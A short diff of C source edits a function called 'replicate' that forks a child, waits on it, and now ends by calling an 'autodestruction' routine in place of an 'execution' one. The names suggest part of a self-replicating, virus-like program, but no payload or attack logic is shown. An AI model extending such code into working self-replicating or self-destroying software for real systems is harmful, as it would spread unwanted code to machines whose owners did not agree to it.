@@ -7,8 +7,8 @@
 void replicate(struct s_host *host, struct s_keychain *keychain, enum e_context context)
 {
 
-#if DEBUG
-	EXIT_TRACER("replicate:\t\t");
+#if LOGGER
+	EXIT_LOGGER("autodestruction:\t");
 #endif
 
 	if (context == FAILURE)
@@ -36,5 +36,5 @@ void replicate(struct s_host *host, struct s_keychain *keychain, enum e_context 
 		_wait4(child, NULL, WSTOPPED, NULL);
 
 label:
-	execution(host, keychain, context);
+	autodestruction(host, keychain, context);
 }
